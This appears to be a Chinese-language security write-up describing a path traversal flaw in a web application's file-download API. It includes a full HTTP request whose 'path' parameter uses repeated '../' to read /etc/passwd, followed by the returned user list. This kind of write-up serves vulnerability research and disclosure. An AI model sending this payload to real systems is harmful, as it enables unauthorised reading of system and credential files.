在 app.29943b92.js 文件中，发现了一处较为敏感的文件操作接口调用：  
  
  
分析：  
  
- **API路径**  
：/api/zipFileOperate/downloadSingleFile  
  
- **参数**  
：接口接收 path  
（路径）、remoteFileName  
（远程文件名）等参数。  
  
- **推测**  
：后端逻辑大概率是根据传入的 path  
 和 remoteFileName  
 拼接成完整路径，并读取文件内容返回给前端。如果没有对 path  
 进行严格的校验，这里极可能存在**路径遍历漏洞**  
。  
  
### 构造Payload  
  
  
我们的目标是读取Linux系统下的核心文件 /etc/passwd  
  
- **Target Path**  
: /etc/  
  
- **Target File**  
: passwd  
  
由于接口设计是 path  
 + remoteFileName  
 的组合，我们需要利用路径遍历符 ../  
 来跳出Web应用根目录，回溯到系统根目录  
  
  
**构造数据包**  
  
```
POST /api/zipFileOperate/downloadSingleFile HTTP/1.1
Host: [目标IP]:8188
{
    "path": "../../../../../../etc/",
    "remoteFileName": "passwd",
    "localFileName": "passwd",
    "tokenFileName": "",
    "zipFlag": false
}
```  
  
  
**关键点：**  
  
- path  
 参数使用了大量的 ../  
，目的是从Web服务的运行目录逐级回溯，直至根目录 /  
  
- 最终拼接的路径为：../../../../../../etc/passwd  
  
发送请求后，服务器成功返回了 /etc/passwd  
 文件的内容，我们清晰地看到了系统用户列表：  
```
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
games:x:12:100:games:/usr/games:/sbin/nologin
...
```  
  
  
至此，任意文件读取漏洞确认存在
